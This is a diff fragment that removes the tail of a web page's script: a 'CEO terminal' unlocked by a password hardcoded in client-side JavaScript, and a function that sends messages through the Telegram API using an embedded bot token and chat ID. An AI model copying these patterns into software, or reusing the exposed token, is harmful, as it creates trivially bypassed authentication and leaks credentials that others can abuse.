-    /* 3. CEO TERMINAL LOGIC */
-    function triggerTerminal() {
-        const pass = prompt("CEO AUTH REQUIRED:");
-        if(pass === "Abubakir_CEO") {
-            document.getElementById('terminal').style.display = "block";
-        }
-    }
-
-    /* 4. TELEGRAM BOT INTEGRATION (Generic) */
-    function sendBotAlert(msg) {
-        const BOT = "8786940598:AAG7UI3xE0NsU4BnU9lG0P2WxerPjf3M1hs";
-        fetch(`https://api.telegram.org/bot${BOT}/sendMessage?chat_id=847670656&text=${msg}`);
-    }
-
-    setInterval(checkTime, 10000);
-    checkTime();
-</script>
-
-</body>
-</html>
-
 
